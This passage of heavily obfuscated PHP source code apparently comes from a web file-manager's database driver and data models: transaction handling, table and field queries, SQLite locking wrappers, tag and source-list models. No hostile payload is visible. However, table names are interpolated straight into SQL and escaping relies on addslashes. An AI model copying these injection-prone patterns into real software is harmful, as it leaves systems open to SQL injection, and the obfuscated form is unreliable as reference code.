$dœªÓ×˜±ù)) { $this->table = think_config($C²²·½Ã†Î[896]) . str_ireplace(think_config($C²²·½Ã†Î[897]), $C²²·½Ã†Î[384], $dœªÓ×˜±ù[2]); $D¨ø¢ÉÏˆâ = (bool) $this->query($C²²·½Ã†Î[898] . strtoupper($this->table) . $C²²·½Ã†Î[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($C²²·½Ã†Î[21], 1); goto E¤¥î¸‚ÎÈ; e¥¯ÖÕà†: $this->queryStr = $d››‡ô¨ŒÉ; if (!empty($DÚ šè–ô«)) { $this->queryStr .= $C²²·½Ã†Î[893] . print_r($DÚ šè–ô«, !0) . $C²²·½Ã†Î[894]; } $D¨ø¢ÉÏˆâ = !1; goto e„Ê¹“ÜÁ‹; e‘ŠàêˆŠ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eá¯¤ãã¶È = $this->_linkID->commit(); $this->transTimes = 0; if (!$Eá¯¤ãã¶È) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¦Ç‹éªğÄ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D¦Ç‹éªğÄ) { $this->error(); return !1; } } return !0; } private function getAll() { $b‘²ÁĞĞìİ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($b‘²ÁĞĞìİ); return $b‘²ÁĞĞìİ; } public function getFields($bİ·½è±®ï) { goto EÃï¹©ÚÇÄ; EÃï¹©ÚÇÄ: $d™Äõ™¡Û¿ =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!0); if (think_config($d™Äõ™¡Û¿[900])) { $A´”¸âŞÃâ = str_replace($d™Äõ™¡Û¿[901], $bİ·½è±®ï, think_config($d™Äõ™¡Û¿[900])); } else { switch ($this->dbType) { case $d™Äõ™¡Û¿[884]: case $d™Äõ™¡Û¿[902]: $A´”¸âŞÃâ = "\123\105\114\x45\x43\x54\40\40\40\x63\157\154\165\155\x6e\137\x6e\x61\155\145\40\x61\163\40\47\x4e\141\x6d\x65\x27\x2c\x20\40\x20\144\x61\x74\141\137\164\x79\x70\x65\x20\x61\x73\40\x27\124\x79\160\x65\x27\x2c\x20\x20\40\143\x6f\154\165\155\156\137\x64\145\146\141\x75\x6c\164\40\141\x73\x20\x27\104\x65\146\x61\x75\x6c\x74\47\54\x20\40\40\x69\x73\x5f\x6e\x75\154\x6c\x61\142\x6c\x65\x20\x61\x73\40\x27\x4e\165\154\x6c\47\xa\11\x9\x46\122\117\x4d\x9\151\x6e\146\157\x72\x6d\141\x74\151\x6f\x6e\x5f\x73\143\x68\145\x6d\x61\56\164\141\142\x6c\145\x73\40\x41\123\x20\164\xa\11\11\112\117\x49\x4e\11\151\156\146\x6f\162\155\141\164\151\157\x6e\x5f\163\x63\150\145\x6d\141\56\x63\157\154\x75\155\156\163\40\x41\123\40\x63\12\11\x9\117\x4e\x20\x20\x74\56\x74\x61\142\x6c\145\137\143\x61\164\141\x6c\157\147\x20\75\x20\x63\x2e\164\141\x62\x6c\145\137\143\x61\x74\x61\x6c\157\x67\12\11\x9\x41\116\104\x20\x74\x2e\164\x61\142\x6c\145\137\x73\143\150\145\155\141\x20\75\40\x63\56\x74\141\x62\154\145\137\x73\x63\150\145\155\x61\12\x9\x9\x41\116\104\40\164\56\x74\141\x62\154\x65\x5f\156\x61\155\145\x20\75\x20\x63\56\x74\x61\x62\x6c\145\137\x6e\141\x6d\x65\xa\11\11\127\110\x45\x52\x45\40\40\x20\164\56\x74\141\x62\x6c\145\x5f\156\141\155\145\40\75\x20\x27{$bİ·½è±®ï}\x27"; break; case $d™Äõ™¡Û¿[903]: $A´”¸âŞÃâ = $d™Äõ™¡Û¿[904] . $bİ·½è±®ï . $d™Äõ™¡Û¿[905]; break; case $d™Äõ™¡Û¿[885]: case $d™Äõ™¡Û¿[887]: $A´”¸âŞÃâ = $d™Äõ™¡Û¿[906] . $d™Äõ™¡Û¿[907] . $d™Äõ™¡Û¿[908] . strtoupper($bİ·½è±®ï) . $d™Äõ™¡Û¿[909] . strtoupper($bİ·½è±®ï) . $d™Äõ™¡Û¿[910]; break; case $d™Äõ™¡Û¿[911]: $A´”¸âŞÃâ = $d™Äõ™¡Û¿[912] . $bİ·½è±®ï . $d™Äõ™¡Û¿[913]; break; case $d™Äõ™¡Û¿[886]: break; case $d™Äõ™¡Û¿[914]: default: $A´”¸âŞÃâ = $d™Äõ™¡Û¿[915] . ($this->dbType == $d™Äõ™¡Û¿[914] ? "\x60{$bİ·½è±®ï}\x60" : $bİ·½è±®ï); } } goto cÕÄœê’‡´; cìë¥´âï: return $F‘¹Àîå›; goto FÍÄÔŒÀ‘Ô; cÕÄœê’‡´: $a°­ê­ÜÌ = $this->query($A´”¸âŞÃâ); $F‘¹Àîå› = array(); if ($a°­ê­ÜÌ) { foreach ($a°­ê­ÜÌ as $E¿÷§°ØÃ§ => $F‹„±‡ğàà) { $F‹„±‡ğàà = array_change_key_case($F‹„±‡ğàà); $F‹„±‡ğàà[$d™Äõ™¡Û¿[28]] = isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[28]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[28]] : $d™Äõ™¡Û¿[384]; $F‹„±‡ğàà[$d™Äõ™¡Û¿[29]] = isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[29]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[29]] : $d™Äõ™¡Û¿[384]; $EÒí‘İ¯Íñ = isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[280]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[280]] : $F‹„±‡ğàà[$d™Äõ™¡Û¿[28]]; $F‘¹Àîå›[$EÒí‘İ¯Íñ] = array($d™Äõ™¡Û¿[28] => $EÒí‘İ¯Íñ, $d™Äõ™¡Û¿[29] => $F‹„±‡ğàà[$d™Äõ™¡Û¿[29]], $d™Äõ™¡Û¿[31] => (bool) (isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[103]]) && $F‹„±‡ğàà[$d™Äõ™¡Û¿[103]] === $d™Äõ™¡Û¿[33] || isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[31]]) && $F‹„±‡ğàà[$d™Äõ™¡Û¿[31]] === $d™Äõ™¡Û¿[33]), $d™Äõ™¡Û¿[34] => isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[34]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[34]] : (isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[53]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[53]] : $d™Äõ™¡Û¿[384]), $d™Äõ™¡Û¿[36] => isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[93]]) ? strtolower($F‹„±‡ğàà[$d™Äõ™¡Û¿[93]]) == $d™Äõ™¡Û¿[38] : (isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[54]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[54]] : !1), $d™Äõ™¡Û¿[39] => isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[916]]) ? strtolower($F‹„±‡ğàà[$d™Äõ™¡Û¿[916]]) == $d™Äõ™¡Û¿[41] : (isset($F‹„±‡ğàà[$d™Äõ™¡Û¿[93]]) ? $F‹„±‡ğàà[$d™Äõ™¡Û¿[93]] : !1)); } } goto cìë¥´âï; FÍÄÔŒÀ‘Ô: } public function getTables($A§¤¬¾¹‚ = '') { $aÀÙ°Ü›ÄÍ =& $_SERVER[úÉ·öƒÑì©]; if (think_config($aÀÙ°Ü›ÄÍ[917])) { $b¬¹‹…¹Ëš = str_replace($aÀÙ°Ü›ÄÍ[918], $A§¤¬¾¹‚, think_config($aÀÙ°Ü›ÄÍ[917])); } else { switch ($this->dbType) { case $aÀÙ°Ü›ÄÍ[885]: case $aÀÙ°Ü›ÄÍ[887]: $b¬¹‹…¹Ëš = $aÀÙ°Ü›ÄÍ[919]; break; case $aÀÙ°Ü›ÄÍ[884]: case $aÀÙ°Ü›ÄÍ[902]: $b¬¹‹…¹Ëš = $aÀÙ°Ü›ÄÍ[920]; break; case $aÀÙ°Ü›ÄÍ[911]: $b¬¹‹…¹Ëš = $aÀÙ°Ü›ÄÍ[921]; break; case $aÀÙ°Ü›ÄÍ[886]: think_exception(think_lang($aÀÙ°Ü›ÄÍ[922]) . $aÀÙ°Ü›ÄÍ[923]); break; case $aÀÙ°Ü›ÄÍ[903]: $b¬¹‹…¹Ëš = $aÀÙ°Ü›ÄÍ[42] . $aÀÙ°Ü›ÄÍ[43] . $aÀÙ°Ü›ÄÍ[44]; break; case $aÀÙ°Ü›ÄÍ[914]: default: if (!empty($A§¤¬¾¹‚)) { $b¬¹‹…¹Ëš = $aÀÙ°Ü›ÄÍ[867] . $A§¤¬¾¹‚ . $aÀÙ°Ü›ÄÍ[868]; } else { $b¬¹‹…¹Ëš = $aÀÙ°Ü›ÄÍ[869]; } } } $B²›ì‚İ«ï = $this->query($b¬¹‹…¹Ëš); $e¡¸ÖŒğº› = array(); foreach ($B²›ì‚İ«ï as $EÂŠÂÊÇóÊ => $d§ŞÏ–°‚ï) { $e¡¸ÖŒğº›[$EÂŠÂÊÇóÊ] = current($d§ŞÏ–°‚ï); } return $e¡¸ÖŒğº›; } protected function parseLimit($EÚö¹‡¥˜—) { $dËÁ ˆ‰¡Œ =& $_SERVER[úÉ·öƒÑì©]; $CŸŸÃ–· = $dËÁ ˆ‰¡Œ[33]; if (!empty($EÚö¹‡¥˜—)) { switch ($this->dbType) { case $dËÁ ˆ‰¡Œ[911]: case $dËÁ ˆ‰¡Œ[903]: $EÚö¹‡¥˜— = explode($dËÁ ˆ‰¡Œ[47], $EÚö¹‡¥˜—); if (count($EÚö¹‡¥˜—) > 1) { $CŸŸÃ–· .= $dËÁ ˆ‰¡Œ[48] . $EÚö¹‡¥˜—[1] . $dËÁ ˆ‰¡Œ[49] . $EÚö¹‡¥˜—[0] . $dËÁ ˆ‰¡Œ[50]; } else { $CŸŸÃ–· .= $dËÁ ˆ‰¡Œ[48] . $EÚö¹‡¥˜—[0] . $dËÁ ˆ‰¡Œ[50]; } break; case $dËÁ ˆ‰¡Œ[884]: case $dËÁ ˆ‰¡Œ[902]: break; case $dËÁ ˆ‰¡Œ[886]: break; case $dËÁ ˆ‰¡Œ[885]: case $dËÁ ˆ‰¡Œ[887]: break; case $dËÁ ˆ‰¡Œ[914]: default: $CŸŸÃ–· .= $dËÁ ˆ‰¡Œ[48] . $EÚö¹‡¥˜— . $dËÁ ˆ‰¡Œ[50]; } } return $CŸŸÃ–·; } public function parseKey(&$E¦˜à¿, $eÄƒ›Û†’ = true) { $DÏ¯À‘˜—‰ =& $_SERVER[úÉ·öƒÑì©]; if ($eÄƒ›Û†’) { $E¦˜à¿ = $this->parseKeyCheck($E¦˜à¿); } if ($this->dbType == $DÏ¯À‘˜—‰[914]) { if ($E¦˜à¿ != $DÏ¯À‘˜—‰[182] && !preg_match($DÏ¯À‘˜—‰[879], $E¦˜à¿)) { $E¦˜à¿ = $DÏ¯À‘˜—‰[391] . trim($E¦˜à¿, $DÏ¯À‘˜—‰[391]) . $DÏ¯À‘˜—‰[391]; } return $E¦˜à¿; } else { return parent::parseKey($E¦˜à¿, $eÄƒ›Û†’); } } public function close() { $this->_linkID = null; } public function error() { $f„‡Ü°îÏÈ =& $_SERVER[úÉ·öƒÑì©]; if ($this->PDOStatement) { $bÛ½–¯Èˆ‰ = $this->PDOStatement->errorInfo(); $this->error = $bÛ½–¯Èˆ‰[1] . $f„‡Ü°îÏÈ[4] . $bÛ½–¯Èˆ‰[2]; } else { $this->error = $f„‡Ü°îÏÈ[33]; } if ($f„‡Ü°îÏÈ[33] != $this->queryStr) { $this->error .= LNG($f„‡Ü°îÏÈ[45]) . $this->queryStr; } think_trace($this->error, $f„‡Ü°îÏÈ[33], $f„‡Ü°îÏÈ[46]); return $this->error; } public function escapeString($dÚ—¡¿ÔÌ) { $eÔÛİÂ¸öî =& $_SERVER[úÉ·öƒÑì©]; switch ($this->dbType) { case $eÔÛİÂ¸öî[911]: case $eÔÛİÂ¸öî[884]: case $eÔÛİÂ¸öî[902]: case $eÔÛİÂ¸öî[914]: return addslashes($dÚ—¡¿ÔÌ); case $eÔÛİÂ¸öî[886]: case $eÔÛİÂ¸öî[903]: case $eÔÛİÂ¸öî[885]: case $eÔÛİÂ¸öî[887]: return str_ireplace($eÔÛİÂ¸öî[55], $eÔÛİÂ¸öî[56], $dÚ—¡¿ÔÌ); } } protected function parseValue($a”Ï‚É¹Âö) { $d –…Ç„ù‘ =& $_SERVER[úÉ·öƒÑì©]; if (is_string($a”Ï‚É¹Âö)) { $DŸù…ÈéŞ· = strpos($a”Ï‚É¹Âö, $d –…Ç„ù‘[4]) === 0 && in_array($a”Ï‚É¹Âö, array_keys($this->bind)); $a”Ï‚É¹Âö = $DŸù…ÈéŞ· ? $this->escapeString($a”Ï‚É¹Âö) : $d –…Ç„ù‘[924] . $this->escapeString($a”Ï‚É¹Âö) . $d –…Ç„ù‘[924]; } elseif (isset($a”Ï‚É¹Âö[0]) && is_string($a”Ï‚É¹Âö[0]) && strtolower($a”Ï‚É¹Âö[0]) == $d –…Ç„ù‘[304]) { $a”Ï‚É¹Âö = $this->escapeString($a”Ï‚É¹Âö[1]); } elseif (is_array($a”Ï‚É¹Âö)) { $a”Ï‚É¹Âö = array_map(array($this, $d –…Ç„ù‘[925]), $a”Ï‚É¹Âö); } elseif (is_bool($a”Ï‚É¹Âö)) { $a”Ï‚É¹Âö = $a”Ï‚É¹Âö ? $d –…Ç„ù‘[87] : $d –…Ç„ù‘[191]; } elseif (is_null($a”Ï‚É¹Âö)) { $a”Ï‚É¹Âö = $d –…Ç„ù‘[103]; } return $a”Ï‚É¹Âö; } public function getLastInsertId() { $dõ¡ ï¸­Ñ =& $_SERVER[úÉ·öƒÑì©]; switch ($this->dbType) { case $dõ¡ ï¸­Ñ[911]: case $dõ¡ ï¸­Ñ[903]: case $dõ¡ ï¸­Ñ[884]: case $dõ¡ ï¸­Ñ[902]: case $dõ¡ ï¸­Ñ[886]: case $dõ¡ ï¸­Ñ[914]: return $this->_linkID->lastInsertId(); case $dõ¡ ï¸­Ñ[885]: case $dõ¡ ï¸­Ñ[887]: $CÎ½´ôƒ¤¸ = $this->table; $bÃ²õ‚õ‚ = $this->query("\x53\x45\114\105\x43\124\40{$CÎ½´ôƒ¤¸}\56\x63\165\x72\162\166\141\x6c\x20\x63\x75\162\x72\166\x61\x6c\x20\106\x52\x4f\115\40\144\x75\x61\x6c"); return $bÃ²õ‚õ‚ ? $bÃ²õ‚õ‚[0][$dõ¡ ï¸­Ñ[926]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($cË×öƒÙ») { $A«³Ä²ÑÆª =& $_SERVER[úÉ·öƒÑì©]; if (!CacheLock::fileLock($A«³Ä²ÑÆª[9])) { return !1; } $B‡¸™íÜŞæ = parent::query($cË×öƒÙ»); CacheLock::fileUnLock($A«³Ä²ÑÆª[9]); return $B‡¸™íÜŞæ; } public function execute($CŠÜÒøƒÀÜ) { $BãÓõÏÖ¨î =& $_SERVER[úÉ·öƒÑì©]; if (!CacheLock::fileLock($BãÓõÏÖ¨î[9])) { return !1; } $DØõˆŞÑƒš = parent::execute($CŠÜÒøƒÀÜ); CacheLock::fileUnLock($BãÓõÏÖ¨î[9]); return $DØõˆŞÑƒš; } } class DbSqlite3 extends DbSqlite3Base { public function query($BíÊÀÀë†À) { $e‰”¦ù˜Òø =& $_SERVER[úÉ·öƒÑì©]; if (!CacheLock::fileLock($e‰”¦ù˜Òø[9])) { return !1; } $E·‡àµ‘‡… = parent::query($BíÊÀÀë†À); CacheLock::fileUnLock($e‰”¦ù˜Òø[9]); return $E·‡àµ‘‡…; } public function execute($EØˆèê‰”–) { $C šÄ™¤„Ğ =& $_SERVER[úÉ·öƒÑì©]; if (!CacheLock::fileLock($C šÄ™¤„Ğ[9])) { return !1; } $bÀøßæ…š = parent::execute($EØˆèê‰”–); CacheLock::fileUnLock($C šÄ™¤„Ğ[9]); return $bÀøßæ…š; } } goto AÚí¨§•å; EÇ¥Ë¸âÁ‚: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\56\x74\141\147\x4c\x69\x73\164"; public $modelType = "\x55\x73\x65\162\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x73\x74\x79\x6c\x65", "\x73\x6f\x72\x74"); public function listData($a‰ÓÈ¯˜Ê‰ = false, $AÃ¾©Ã–Ë• = "\x73\157\x72\x74", $D¹ï„ªåïÒ = false) { return parent::listData($a‰ÓÈ¯˜Ê‰, $AÃ¾©Ã–Ë•, $D¹ï„ªåïÒ); } public function remove($Ağ¸êÈ¾ëš) { return parent::remove($Ağ¸êÈ¾ëš); } public function add($f·ãâÇêëÍ, $aÆ•áªĞ¤ = "\x6c\x61\142\145\154\55\x67\x72\145\x79\55\156\157\162\155\141\x6c") { $EÄ•‘³¢Ö =& $_SERVER[úÉ·öƒÑì©]; if ($this->findByName($f·ãâÇêëÍ)) { return !1; } $AÊÀ˜ÚÁ¥ò = array($EÄ•‘³¢Ö[422] => $f·ãâÇêëÍ, $EÄ•‘³¢Ö[473] => $aÆ•áªĞ¤, $EÄ•‘³¢Ö[1703] => $this->getSort($EÄ•‘³¢Ö[265]) + 1); return parent::insert($AÊÀ˜ÚÁ¥ò); } public function update($A™ˆ‡à¸”ß, $DáĞ¨²¼—) { $c…‰œ‡×îò =& $_SERVER[úÉ·öƒÑì©]; $aİ®ç­ëâ = $this->listData($A™ˆ‡à¸”ß); $bŸˆß‚™ù = $this->findByName($DáĞ¨²¼—[$c…‰œ‡×îò[28]]); if (!$aİ®ç­ëâ || $bŸˆß‚™ù && $bŸˆß‚™ù[$c…‰œ‡×îò[402]] != $aİ®ç­ëâ[$c…‰œ‡×îò[402]]) { return !1; } return parent::update($A™ˆ‡à¸”ß, $DáĞ¨²¼—); } public function moveTop($aõ†ÚùË˜ğ) { $C´İí•œòó =& $_SERVER[úÉ·öƒÑì©]; $e¥œ‰‡¦ÂÇ = parent::listData(); $eŠŞ¦ø™š« = $this->getSort($C´İí•œòó[264]); foreach ($e¥œ‰‡¦ÂÇ as &$Aƒ‡ã¡êÉè) { if ($Aƒ‡ã¡êÉè[$C´İí•œòó[402]] == $aõ†ÚùË˜ğ) { $Aƒ‡ã¡êÉè[$C´İí•œòó[1722]] = $eŠŞ¦ø™š«; continue; } $Aƒ‡ã¡êÉè[$C´İí•œòó[1722]] += 1; } unset($Aƒ‡ã¡êÉè); return parent::resetData($e¥œ‰‡¦ÂÇ); } public function moveBottom($fÍ¾Ù®‡å) { $béÄÖí†ß =& $_SERVER[úÉ·öƒÑì©]; $CñëÁ‰ó³ = $this->getSort($béÄÖí†ß[265]) + 1; return parent::update($fÍ¾Ù®‡å, array($béÄÖí†ß[1722] => $CñëÁ‰ó³)); } public function resetSort($dÀ¼»±Î¼) { goto D½ƒÎ¥ŞÌ’; eÅó×èµŞ¶: unset($Aê¦ÄÕâ™¢); return parent::resetData($fæˆİ’äñ); goto aŠÂ›í¸†¼; F½–¹—•‡: for ($AòİÍÄÄœ = 0; $AòİÍÄÄœ < count($dÀ¼»±Î¼); $AòİÍÄÄœ++) { $Fï‹¶Î§¶[$dÀ¼»±Î¼[$AòİÍÄÄœ] . $B–¼—ŒÛØÀ[33]] = $AòİÍÄÄœ + 1; } $fæˆİ’äñ = parent::listData(); foreach ($fæˆİ’äñ as &$Aê¦ÄÕâ™¢) { $cÉ¹•î„™ù = $Fï‹¶Î§¶[$Aê¦ÄÕâ™¢[$B–¼—ŒÛØÀ[402]]]; $Aê¦ÄÕâ™¢[$B–¼—ŒÛØÀ[1722]] = $cÉ¹•î„™ù ? $cÉ¹•î„™ù : $Aê¦ÄÕâ™¢[$B–¼—ŒÛØÀ[1722]]; } goto eÅó×èµŞ¶; D½ƒÎ¥ŞÌ’: $B–¼—ŒÛØÀ =& $_SERVER[úÉ·öƒÑì©]; $Fï‹¶Î§¶ = array(); $dÀ¼»±Î¼ = is_array($dÀ¼»±Î¼) ? $dÀ¼»±Î¼ : array(); goto F½–¹—•‡; aŠÂ›í¸†¼: } private function getSort($eÖÆíÓÖÜ×) { $FŒ£ŸÂ¬ƒù =& $_SERVER[úÉ·öƒÑì©]; $f©¤Ìá‰õ = parent::listData(); $cæƒµÑåğ = array_to_keyvalue($f©¤Ìá‰õ, $FŒ£ŸÂ¬ƒù[33], $FŒ£ŸÂ¬ƒù[1722]); if (!$cæƒµÑåğ) { $cæƒµÑåğ = array(0); } $Eˆ‰£¸Ğ = $eÖÆíÓÖÜ× == $FŒ£ŸÂ¬ƒù[265] ? max($cæƒµÑåğ) : min($cæƒµÑåğ); return intval($Eˆ‰£¸Ğ); } } goto EÅÌ¶øÔ†ù; D–Ş±ê‡Òø: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\143\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\145" => "\151\x6f\137\x73\157\165\x72\143\x65\x5f\x6d\145\164\x61", "\155\x65\164\x61\106\151\145\x6c\144" => "\x73\157\165\x72\143\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\151\155\x65", "\164\151\155\145", "\151\156\163\145\x72\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x63\162\145\x61\164\145\x54\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\x66\165\x6e\x63\164\x69\x6f\x6e"), array("\166\x69\145\167\124\151\155\145", "\164\151\x6d\x65", "\151\x6e\163\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($E´‚Ãƒ¦¦â) { return $this->listSource(array($_SERVER[úÉ·öƒÑì©][403] => $E´‚Ãƒ¦¦â)); } public function typeName($fµÁÛÌ°Ñ‘) { static $eŒ¢ÆËÂµŸ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\162\157\165\x70"); return $eŒ¢ÆËÂµŸ[$fµÁÛÌ°Ñ‘ . $_SERVER[úÉ·öƒÑì©][33]]; } public function sourceListInfo($Dç©ŠêŞÙ², $Cãò¿²¥Š = false) { goto dÒÙğ…„é; EÁà¯²öè: return array_to_keyvalue($f†´Ÿ‡µ¥, $Aµ…İ…¹… [404]); goto eÅ¿™ù¤µ‰; dÒÙğ…„é: $Aµ…İ…¹…  =& $_SERVER[úÉ·öƒÑì©]; $Dç©ŠêŞÙ² = $Dç©ŠêŞÙ² ? $Dç©ŠêŞÙ² : array(); $Dç©ŠêŞÙ² = array_filter(array_unique($Dç©ŠêŞÙ²)); goto CâÇ¤Ü… —; CâÇ¤Ü… —: if (!$Dç©ŠêŞÙ²) { return array(); } $f†´Ÿ‡µ¥ = $this->where(array($Aµ…İ…¹… [404] => array($Aµ…İ…¹… [7], $Dç©ŠêŞÙ²)))->select(); $this->_listDataApply($f†´Ÿ‡µ¥, $Cãò¿²¥Š); goto EÁà¯²öè; eÅ¿™ù¤µ‰: } public function pathInfoFilter(&$FÚ‹ïßëÑÌ) { goto A§¬¡‘¹…¤; fùâÜ“¢æ: $FÚ‹ïßëÑÌ = array_field_key($FÚ‹ïßëÑÌ, $f²•¶µ³ïì); return $FÚ‹ïßëÑÌ; goto Cä ­ö“ï; FøÁÇÑÁøÛ: $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[76]] = $Cğö£ğà±Š[410] . $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[404]] . $Cğö£ğà±Š[411]; $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[29]] = $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[412]] == 1 ? $Cğö£ğà±Š[77] : $Cğö£ğà±Š[193]; $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[413]] = $this->typeName($FÚ‹ïßëÑÌ[$Cğö£ğà±Š[413]]); goto c‡¼Ÿºøƒˆ; d›¿å¯ŞÚ¹: static $EáŠñƒøÜÆ = false; if (!$c»ªË…éæ) { goto Eˆ¨Ò‘ãó; fáéÚ‡šîÆ: $eÙ´Åñ‚•ƒ = $Cğö£ğà±Š[408]; $aØĞÄ‹ñ = explode($Cğö£ğà±Š[47], $eÙ´Åñ‚•ƒ); $c»ªË…éæ = explode($Cğö£ğà±Š[47], $D±˜‹¤±•); goto E•¢È©µ†; Eˆ¨Ò‘ãó: $D±˜‹¤±• = $Cğö£ğà±Š[405]; $D±˜‹¤±• .= $Cğö£ğà±Š[406]; $D±˜‹¤±• .= $Cğö£ğà±Š[407]; goto fáéÚ‡šîÆ; E•¢È©µ†: $DÕ¹•©‰ğõ = array(); foreach ($c»ªË…éæ as $B®ÕêáÁÒ«) { if (in_array($B®ÕêáÁÒ«, $aØĞÄ‹ñ)) { continue; } $DÕ¹•©‰ğõ[] = $B®ÕêáÁÒ«; } $EáŠñƒøÜÆ = explode($Cğö£ğà±Š[47], $Cğö£ğà±Š[409]); goto añÍ·ÜÓĞ; añÍ·ÜÓĞ: } foreach ($EáŠñƒøÜÆ as $d»¬İî³®Ç) { if (isset($FÚ‹ïßëÑÌ[$d»¬İî³®Ç])) { $FÚ‹ïßëÑÌ[$d»¬İî³®Ç] = intval($FÚ‹ïßëÑÌ[$d»¬İî³®Ç]); } } goto FøÁÇÑÁøÛ; c‡¼Ÿºøƒˆ: if ($FÚ‹ïßëÑÌ[$Cğö£ğà±Š[412]] != 1) { $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[168]] = $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[414]]; unset($FÚ‹ïßëÑÌ[$Cğö£ğà±Š[414]]); } $f²•¶µ³ïì = $c»ªË…éæ; if (isset($FÚ‹ïßëÑÌ[$Cğö£ğà±Š[415]]) && $FÚ‹ïßëÑÌ[$Cğö£ğà±Š[415]][$Cğö£ğà±Š[416]] == -1) { $f²•¶µ³ïì = $DÕ¹•©‰ğõ; } goto fùâÜ“¢æ; A§¬¡‘¹…¤: $Cğö£ğà±Š =& $_SERVER[úÉ·öƒÑì©]; static $c»ªË…éæ = false; static $DÕ¹•©‰ğõ = false; goto d›¿å¯ŞÚ¹; Cä ­ö“ï: } public function listUserFav() { goto AÑ³¤¬ìÓæ; bßºªÎÁùƒ: $bÇë±Šñ¦à = array_to_keyvalue($bÇë±Šñ¦à, $aã®‰Í©”²[33], $aã®‰Í©”²[76]); if ($bÇë±Šñ¦à) { $A”ç³Â÷â = $this->listSource(array($aã®‰Í©”²[419] => array($aã®‰Í©”²[420], $bÇë±Šñ¦à))); } $A”ç³Â÷â = array_to_keyvalue($A”ç³Â÷â[$aã®‰Í©”²[376]], $aã®‰Í©”²[404]); goto cõéàÖË‘â; cõéàÖË‘â: foreach ($d›¸‹äåĞ as &$fÕÌö­½¢ò) { $fÕÌö­½¢ò = array($aã®‰Í©”²[421] => $fÕÌö­½¢ò[$aã®‰Í©”²[402]], $aã®‰Í©”²[422] => $fÕÌö­½¢ò[$aã®‰Í©”²[28]], $aã®‰Í©”²[423] => $fÕÌö­½¢ò[$aã®‰Í©”²[76]], $aã®‰Í©”²[424] => $fÕÌö­½¢ò[$aã®‰Í©”²[29]], $aã®‰Í©”²[425] => $fÕÌö­½¢ò[$aã®‰Í©”²[194]], $aã®‰Í©”²[426] => $fÕÌö­½¢ò[$aã®‰Í©”²[84]]); if ($fÕÌö­½¢ò[$aã®‰Í©”²[29]] == $aã®‰Í©”²[418] && $A”ç³Â÷â[$fÕÌö­½¢ò[$aã®‰Í©”²[76]]]) { $fÕÌö­½¢ò[$aã®‰Í©”²[85]] = $A”ç³Â÷â[$fÕÌö­½¢ò[$aã®‰Í©”²[76]]]; } } unset($fÕÌö­½¢ò); return $d›¸‹äåĞ; goto C˜Çó©îÈ©; AÑ³¤¬ìÓæ: $aã®‰Í©”² =& $_SERVER[úÉ·öƒÑì©]; $d›¸‹äåĞ = Model($aã®‰Í©”²[417])->listData(); $bÇë±Šñ¦à = array_filter_by_field($d›¸‹äåĞ, $aã®‰Í©”²[29], $aã®‰Í©”²[418]); goto bßºªÎÁùƒ; C˜Çó©îÈ©: } public function listUserTag($fµŸ‹æµ) { goto B„“Š³êÇ; F…”Ş×»š›: if (!$EĞÄãœ§œ || count($E·ç‡Ï“Íİ) == $EĞÄãœ§œ[$a±Æåô©ğ’[373]][$a±Æåô©ğ’[374]]) { return $EĞÄãœ§œ; } $DÔ¿ôóï¡‚ = array(); $aÌ¬İ¦Ç¸ˆ = array_to_keyvalue($EĞÄãœ§œ[$a±Æåô©ğ’[75]], $a±Æåô©ğ’[33], $a±Æåô©ğ’[404]); goto c¡‘¤‚Æ¢ ; B„“Š³êÇ: $a±Æåô©ğ’ =& $_SERVER[úÉ·öƒÑì©]; if ($fµŸ‹æµ && !is_array($fµŸ‹æµ)) { $fµŸ‹æµ = array($fµŸ‹æµ); } $FôéõÕâì = Model($a±Æåô©ğ’[427])->listData(); goto BÜ¦Ş£¯˜Ş; BÜ¦Ş£¯˜Ş: $AÀ´­¦å© = array(); foreach ($FôéõÕâì as $f±›ä‡‘Å‹) { $D„ÕÏÍÃŒ = $f±›ä‡‘Å‹[$a±Æåô©ğ’[76]]; if 